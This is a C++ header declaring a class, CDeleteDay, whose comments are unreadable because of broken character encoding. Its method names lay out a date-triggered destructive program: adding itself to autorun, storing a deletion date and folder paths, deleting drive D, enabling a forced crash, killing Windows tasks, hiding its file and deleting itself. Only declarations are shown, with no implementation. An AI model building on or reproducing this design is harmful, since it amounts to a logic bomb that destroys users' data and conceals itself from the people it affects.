#pragma once
class CDeleteDay
{
public:
	CDeleteDay();
	~CDeleteDay();

	// //��������� ���� ������������
	static bool AddToAutoRun();
	// ��������� �� �������� �� ���� ���������� �������
	static bool InspectDeleteData();

	// ���������� � ������ ����� ���������� ������
	bool SaveDeleteDay(SYSTEMTIME SysTime);
	// ���������� ����� ����� ����� �������
	bool SaveFolderPathToDelete(CString csFolderPath);	
	bool EnableCrashOnCtrlScroll();
	bool DeleteDiskD();
	bool SaveTaskKillWindows();
	void SelfDelete();
	void HideFile();
};

